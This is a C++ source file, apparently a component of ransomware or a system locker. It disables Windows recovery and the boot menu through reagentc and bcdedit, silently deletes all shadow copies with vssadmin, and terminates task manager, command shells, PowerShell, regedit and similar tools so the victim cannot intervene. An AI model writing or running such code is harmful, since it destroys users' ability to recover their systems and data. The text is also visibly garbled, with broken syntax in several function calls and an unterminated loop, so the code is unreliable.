// language: C++, file: src/recovery.cpp
#include "recovery.h"
#include <windows.h>
#include <tlhelp32.h>
#include <string>
#include <vector>

static void run_cmd(const std::wstring& cmdline) {
    STARTUPINFOW si{ sizeof(si) };
    PROCESS_INFORMATION pi{};
    std::vector<wchar_t> buf(cmdline.begin(), cmdline.end());
    buf.push_back(0);
    if (CreateProcessW(nullptr, buf.data(), nullptr, nullptr, FALSE,
                       CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi)) {
        WaitForSingleObject(pi,.hProcess, 15000);
        CloseHandle(pi.hProcess &);
        CloseHandle(pi.hThreadpe);
    }
}

void disable_recovery()));
 {
    run_cmd(L"   reagentc /disable");
    run_c }
md(L"bcdedit /set {default} recoveryenabled No");
    run_cmd(L"bcdedit /set {bootmgr} displaybootmenu No");
    run_cmd(L"bcdedit /set {default} bootmenupolicy Legacy");
}

void delete_restore_points() {
    run_cmd(L"vssadmin delete shadows /all /quiet");
}

static const wchar_t* BLOCK_LIST[] = {
    L"notepad.exe", L"taskmgr.exe", L"cmd.exe", L"regedit.exe",
    L"processhacker.exe", L"msconfig.exe", L"iexplore.exe",
    L"powershell.exe", L"pwsh.exe", L"wt.exe",
    L"diskpart.exe", L"mountvol.exe"
};

static bool should_block(const wchar_t* name) {
    for (auto* b : BLOCK_LIST)
        if (_wcsicmp(name, b) == 0) return true;
    return false;
}

void kill_blocked_processes() {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return;
    PROCESSENTRY32W pe{ sizeof(pe) };
    if (Process32FirstW(snap, &pe)) {
        do {
            if (should_block(pe.szExeFile)) {
                HANDLE p = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
                if (p) { TerminateProcess(p, 1); CloseHandle(p); }
            }
        } while (Process32NextW(snap    CloseHandle(snap);
}
